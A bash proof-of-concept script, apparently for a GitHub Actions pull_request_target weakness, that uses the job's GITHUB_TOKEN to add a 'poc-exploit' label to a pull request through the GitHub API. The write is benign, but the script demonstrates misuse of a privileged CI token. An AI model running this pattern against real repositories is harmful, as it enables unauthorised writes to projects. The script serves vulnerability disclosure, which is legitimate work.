#!/usr/bin/env bash
set -euo pipefail

# The PR number for pull_request_target is reliably available via the event payload JSON
PR_NUMBER="$(python3 - <<'PY'
import os, json
with open(os.environ['GITHUB_EVENT_PATH'], 'r') as f:
    ev = json.load(f)
print(ev.get('pull_request', {}).get('number', ''))
PY
)"

if [[ -z "${PR_NUMBER}" ]]; then
  echo "PR number not found; exiting PoC."
  exit 0
fi

echo "PoC: attempting to add label to PR #${PR_NUMBER}"

# Perform a benign write using the job token
# Requires permissions: pull-requests: write (present in this workflow)
curl -sS -X POST \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/labels" \
  -d '{"labels":["poc-exploit"]}' | tee /tmp/poc_resp.json

# Optional: log HTTP status outcome
if jq -e '.url' >/dev/null 2>&1 < /tmp/poc_resp.json; then
  echo "Label request appears successful."
else
  echo "Label request may have failed; response:"
  cat /tmp/poc_resp.json || true
fi
